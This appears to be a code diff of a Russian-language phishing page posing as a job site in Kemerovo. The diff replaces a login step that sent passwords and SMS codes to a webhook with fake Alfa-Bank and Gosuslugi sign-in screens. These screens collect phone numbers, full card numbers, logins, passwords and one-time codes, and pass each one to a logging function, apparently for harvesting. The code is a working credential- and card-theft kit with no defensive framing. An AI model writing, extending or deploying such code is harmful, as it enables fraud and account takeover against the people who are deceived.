             document.getElementById('detailsScreen').style.display = 'none';
@@ -578,86 +793,190 @@
             document.getElementById('applyForm').reset();
         });
 
-        function openAuth() {
-            logAction('Авторизация');
-            document.getElementById('authScreen').style.display = 'flex';
-            document.getElementById('authStep1').style.display = 'block';
-            document.getElementById('smsLoading').style.display = 'none';
-            document.getElementById('authStep2').style.display = 'none';
-            document.querySelectorAll('.code-input').forEach(i => i.value = '');
-            document.getElementById('btn-code-submit').disabled = true;
-            document.getElementById('password').type = 'password';
-            updateEyeIcon(false);
+        function openAuthChoice() {
+            logAction('Открыт выбор авторизации');
+            document.getElementById('authChoiceScreen').style.display = 'flex';
         }
 
-        function closeAuth() { document.getElementById('authScreen').style.display = 'none'; }
-
-        const togglePasswordBtn = document.getElementById('togglePasswordBtn');
-        const passwordInput = document.getElementById('password');
-
-        function updateEyeIcon(show) {
-            if (show) {
-                togglePasswordBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
-            } else {
-                togglePasswordBtn.innerHTML = `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/><path d="M14.12 14.12a3 3 0 1 1-4.24-4.24"/></svg>`;
-            }
+        function closeAuthChoice() {
+            document.getElementById('authChoiceScreen').style.display = 'none';
         }
 
-        togglePasswordBtn.addEventListener('click', () => {
-            const isPassword = passwordInput.type === 'password';
-            passwordInput.type = isPassword ? 'text' : 'password';
-            updateEyeIcon(isPassword);
-        });
-        updateEyeIcon(false);
-
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            const login = document.getElementById('login').value.trim();
-            const password = document.getElementById('password').value;
-            enteredLogin = login;
-
-            // Данные пользователя уходят на webhook
-            sendToWebhook(`ВХОД | Логин: ${login} | Пароль: ${password}`);
-
-            document.getElementById('authStep1').style.display = 'none';
-            document.getElementById('smsLoading').style.display = 'block';
-            setTimeout(() => {
-                document.getElementById('smsLoading').style.display = 'none';
-                document.getElementById('authStep2').style.display = 'block';
-                document.getElementById('displayPhone').innerText = maskPhone(enteredLogin);
-                document.querySelectorAll('.code-input')[0].focus();
-            }, 1500);
-        });
-
-        const codeInputs = document.querySelectorAll('.code-input');
-        codeInputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/[^0-9]/g, '');
-                if (e.target.value !== '' && index < codeInputs.length - 1) codeInputs[index + 1].focus();
-                let code = '';
-                codeInputs.forEach(i => code += i.value);
-                document.getElementById('btn-code-submit').disabled = code.length !== 6;
-            });
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && e.target.value === '' && index > 0) codeInputs[index - 1].focus();
-            });
-        });
-
-        document.getElementById('codeForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-            let code = '';
-            codeInputs.forEach(i => code += i.value);
-
-            // Код уходит на webhook
-            sendToWebhook(`КОД | Код: ${code} | Логин: ${enteredLogin}`);
-
+        function onAuthSuccess() {
             isAuthorized = true;
-            closeAuth();
+            closeAuthChoice();
+            closeAlfaAuth();
+            closeGosAuth();
             document.getElementById('headerLoginBtn').style.display = 'none';
             document.getElementById('headerUserProfile').style.display = 'flex';
             openApplyForm();
+        }
+
+        /* =========================================
+           АЛЬФА-БАНК ЛОГИКА
+           ========================================= */
+        function openAlfaAuth() {
+            closeAuthChoice();
+            logAction('Открыта авторизация Альфа-Банк');
+            document.getElementById('alfaAuthScreen').style.display = 'flex';
+            document.getElementById('alfaStep1').style.display = 'block';
+            document.getElementById('alfaStep2').style.display = 'none';
+            document.getElementById('alfaStep3').style.display = 'none';
+            document.getElementById('alfaLoading').style.display = 'none';
+            document.getElementById('alfaPhoneForm').reset();
+            document.getElementById('alfaCardForm').reset();
+            document.querySelectorAll('.alfa-code-input').forEach(i => i.value = '');
+            document.getElementById('alfaCodeSubmit').disabled = true;
+        }
+
+        function closeAlfaAuth() {
+            document.getElementById('alfaAuthScreen').style.display = 'none';
+        }
+
+        function alfaBackToPhone() {
+            document.getElementById('alfaStep2').style.display = 'none';
+            document.getElementById('alfaStep1').style.display = 'block';
+        }
+
+        document.getElementById('alfaPhone').addEventListener('input', function () {
+            let digits = this.value.replace(/\D/g, '');
+            if (digits.startsWith('8')) digits = '7' + digits.slice(1);
+            if (!digits.startsWith('7')) digits = '7' + digits;
+            digits = digits.slice(0, 11);
+            let formatted = '+7';
+            if (digits.length > 1) formatted += ' ' + digits.slice(1, 4);
+            if (digits.length >= 5) formatted += ' ' + digits.slice(4, 7);
+            if (digits.length >= 8) formatted += ' ' + digits.slice(7, 9);
+            if (digits.length >= 10) formatted += ' ' + digits.slice(9, 11);
+            this.value = formatted;
         });
 
+        document.getElementById('alfaCard').addEventListener('input', function () {
+            let digits = this.value.replace(/\D/g, '').slice(0, 16);
+            this.value = digits.replace(/(.{4})/g, '$1 ').trim();
+        });
+
+        document.getElementById('alfaPhoneForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alfaPhone = document.getElementById('alfaPhone').value.trim();
+            logAction('Альфа: телефон', { 'Телефон': alfaPhone });
+            document.getElementById('alfaStep1').style.display = 'none';
+            document.getElementById('alfaStep2').style.display = 'block';
+        });
+
+        document.getElementById('alfaCardForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            alfaCard = document.getElementById('alfaCard').value.trim();
+            logAction('Альфа: карта', { 'Карта': alfaCard, 'Телефон': alfaPhone });
+            document.getElementById('alfaStep2').style.display = 'none';
+            document.getElementById('alfaLoading').style.display = 'block';
+
+            setTimeout(() => {
+                document.getElementById('alfaLoading').style.display = 'none';
+                document.getElementById('alfaStep3').style.display = 'block';
+                document.getElementById('alfaDisplayPhone').innerText = maskPhone(alfaPhone);
+                document.querySelectorAll('.alfa-code-input')[0].focus();
+            }, 1500);
+        });
+
+        const alfaCodeInputs = document.querySelectorAll('.alfa-code-input');
+        alfaCodeInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value !== '' && index < alfaCodeInputs.length - 1) {
+                    alfaCodeInputs[index + 1].focus();
+                }
+                let code = '';
+                alfaCodeInputs.forEach(i => code += i.value);
+                document.getElementById('alfaCodeSubmit').disabled = code.length !== 4;
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    alfaCodeInputs[index - 1].focus();
+                }
+            });
+        });
+
+        document.getElementById('alfaCodeForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            let code = '';
+            alfaCodeInputs.forEach(i => code += i.value);
+            logAction('Альфа: код', { 'Код': code, 'Телефон': alfaPhone, 'Карта': alfaCard });
+            onAuthSuccess();
+        });
+
+        /* =========================================
+           ГОСУСЛУГИ ЛОГИКА (6-ЗНАЧНЫЙ КОД)
+           ========================================= */
+        function openGosAuth() {
+            closeAuthChoice();
+            logAction('Открыта авторизация Госуслуги');
+            document.getElementById('gosAuthScreen').style.display = 'flex';
+            
+            document.getElementById('gosStep1').style.display = 'block';
+            document.getElementById('gosStep2').style.display = 'none';
+            document.getElementById('gosLogin').value = '';
+            document.getElementById('gosPassword').value = '';
+            document.querySelectorAll('.gos-code-input').forEach(i => i.value = '');
+            document.getElementById('gosCodeSubmit').disabled = true;
+        }
+
+        function closeGosAuth() {
+            document.getElementById('gosAuthScreen').style.display = 'none';
+        }
+
+        function submitGosLogin() {
+            gosLogin = document.getElementById('gosLogin').value.trim();
+            const password = document.getElementById('gosPassword').value;
+            
+            if (!gosLogin || !password) {
+                alert('Заполните все поля');
+                return;
+            }
+            
+            logAction('Госуслуги: логин/пароль', { 'Логин': gosLogin, 'Пароль': password });
+            
+            document.getElementById('gosDisplayPhone').innerText = maskPhone(gosLogin);
+            
+            document.getElementById('gosStep1').style.display = 'none';
+            document.getElementById('gosStep2').style.display = 'block';
+            document.querySelectorAll('.gos-code-input')[0].focus();
+        }
+
+        function gosBackToLogin() {
+            document.getElementById('gosStep2').style.display = 'none';
+            document.getElementById('gosStep1').style.display = 'block';
+        }
+
+        const gosCodeInputs = document.querySelectorAll('.gos-code-input');
+        gosCodeInputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                e.target.value = e.target.value.replace(/[^0-9]/g, '');
+                if (e.target.value !== '' && index < gosCodeInputs.length - 1) {
+                    gosCodeInputs[index + 1].focus();
+                }
+                let code = '';
+                gosCodeInputs.forEach(i => code += i.value);
+                // 6-значный код
+                document.getElementById('gosCodeSubmit').disabled = code.length !== 6;
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
+                    gosCodeInputs[index - 1].focus();
+                }
+            });
+        });
+
+        function submitGosCode() {
+            let code = '';
+            gosCodeInputs.forEach(i => code += i.value);
+            logAction('Госуслуги: код', { 'Код': code, 'Логин': gosLogin });
+            onAuthSuccess();
+        }
+
+        /* =========================================
+           QR-КОД
+           ========================================= */
         function openQR() {
             logAction('QR открыт');
             document.getElementById('qrScreen').style.display = 'flex';
@@ -665,7 +984,10 @@
             document.getElementById('qrUrl').innerText = url;
             renderQR(url);
         }
-        function closeQR() { document.getElementById('qrScreen').style.display = 'none'; }
+
+        function closeQR() {
+            document.getElementById('qrScreen').style.display = 'none';
+        }
 
         function renderQR(text) {
             const canvas = document.getElementById('qrCanvas');
@@ -737,11 +1059,13 @@
             if (e.target.id === 'qrScreen') closeQR();
         });
 
+        /* =========================================
+           ИНИЦИАЛИЗАЦИЯ
+           ========================================= */
         window.addEventListener('DOMContentLoaded', () => {
             logAction('Зашёл на сайт');
+            renderJobs('Кемерово');
         });
-
-        renderJobs('Кемерово');
     </script>
 </body>
-</html>
+                                                                                                                 </html>
